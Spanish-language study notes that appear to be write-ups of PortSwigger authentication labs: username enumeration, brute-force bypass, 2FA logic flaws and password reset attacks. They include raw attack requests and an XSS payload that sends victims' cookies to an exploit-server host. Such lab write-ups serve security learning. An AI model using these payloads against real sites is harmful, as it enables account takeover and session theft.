## Lab: Username enumeration via different responses

Username valido: `Incorrect Password`
NO valido: `Invalid Username`

## Lab: Username enumeration via subtly different responses

Username valido: `Invalid username or password`
NO valido: `Invalid username of password.`

La diferencia es el `.`

## Lab: Username enumeration via response timing

Intruder con el header `X-Forwarded-For` para ir cambiando la IP
Cuando el username es valido, se tarda un poco más en responder debido a que valida la contraseña. Para forzar a que cuando sea valido se tarde más enviar una contraseña `muy larga`

## Lab: Broken brute-force protection, IP block

Se bloquea la IP luego de ciertos intentos, para desbloquearla es necesario iniciar sesión con usuario valido. 

Para que el ataque de fuerza bruta funcione en esta ocación, se debe, enviar una worlist con: 

| username.txt      | password.txt         |
| ----------------- | -------------------- |
| usuario valido    | contrasñea valida    |
| usuario de prueba | contraseña de prueba |
| usuario valido    | contrasñea valida    |
| usuario de prueba | contraseña de prueba |
| usuario valido    | contrasñea valida    |
| usuario de prueba | contraseña de prueba |
## Lab: Username enumeration via account lock

Si era un usuario valido luego de tres intentos bloqueaba el usuario, si no era valido no bloqueaba el usuario. 
Para identificar la contraseña se enviar un ataque de fuerza bruta, y cuando era valida no salía ningún mensaje de error. 

## Lab: 2FA simple bypass

Cuando se inicia sesión se entrega un token de autenticación, sin validar primero el security code. Lo que permite que si el atacante conoce algun endpoint. Puede simplemente hacer la petición y acceder a este. 
Esto ya que tiene un token de autenticación. 

## Lab: 2FA broken logic

Cuando el usuario completa el primer paso del login, es decir cuando pone su usuario y contraseña, el sitio no verifica que la misma persona complete el siguiente paso. Ya que se basa únicamente en el valor de la `cookie=nombredeusuario`. Y esta puede ser modifica por cualquier nombre de usuario. Por lo que el atacante puede intentar adivinar el código de seguridad y iniciar sesión con cualquier usuario sin necesidad de su contraseña. 

```
POST /login2 HTTP/2
Host: 0a9e00160388a2fd82ad3ded00a500f6.web-security-academy.net
Cookie: verify=<otroUsuario>; session=Qr1DgvpCRNnZJKsIVhx8DCFRspMUtx1N
Content-Length: 15

mfa-code=$1111$
```


## Lab: Brute-forcing a stay-logged-in cookie

Cuando se maneja la característica de mantener sesión iniciada, y esta implementada mediante una cookie persistente. Si esta cookie no es lo suficientemente random, un atacante puede adivinar dicha cookie para un usuario distinto. 

## Lab: Offline password cracking

Explotando el XSS para robar las cookies: 
```html
<script>document.location='https://exploit-0a0500c504949ac480c8026a01c900c8.exploit-server.net/exploit/?'+document.cookie</script>
```

Recibiendo las cookies y desencriptando en MD5: 
![[Pasted image 20251004173500.png]]


## Lab: Password reset broken logic

Request legitima: 
```
POST /forgot-password?temp-forgot-password-token=yffr630va5tx56phha58n1sdsw7hzizz HTTP/2
Host: 0aaf00c9030443f3ed4b35b800ef00a2.web-security-academy.net
Cookie: session=1kk7HD6jqjDGhDIOkau3XLMJ5gmhqCcB

temp-forgot-password-token=yffr630va5tx56phha58n1sdsw7hzizz&username=wiener&new-password-1=prueba&new-password-2=prueba
```

Modifico el nombre de usuario y borro el token: 
```
POST /forgot-password?temp-forgot-password-token=yffr630va5tx56phha58n1sdsw7hzizz HTTP/2
Host: 0aaf00c9030443f3ed4b35b800ef00a2.web-security-academy.net
Cookie: session=1kk7HD6jqjDGhDIOkau3XLMJ5gmhqCcB

temp-forgot-password-token=&username=carlos&new-password-1=prueba&new-password-2=prueba
```

## Lab: Password reset poisoning via middleware

Enviamos una request poniendo nuestro host maliciosos en el header `X-Forwarded-Host`
```
POST /forgot-password HTTP/2
Host: 0a5a004803450fda808ae9df0062001d.web-security-academy.net
X-Forwarded-Host: exploit-0a8c004703160ffe8026e856018000c4.exploit-server.net/exploit
Cookie: session=0O90JCjWJzXbiaMWdqJDOVyqc6eH5mYf

username=carlos
```

Y enviamos el link malicioso a la victima.

## Lab: Password brute-force via password change

```
POST /my-account/change-password HTTP/2
Host: 0a7d004403dd410c826c600a009a002d.web-security-academy.net
Cookie: session=iWc3YnJMYnpH0nyqoCvWvpUNMEIF0vXP

username=carlos&current-password=$test$&new-password-1=asdfasdfasdf&new-password-2=asdfasdfa
```

Enviamos el request con dos contraseñas nuevas que no sean iguales para poder filtrar el mensaje de que no coinciden ya que cuando esto pase significa que la `current-password` si es correcta. 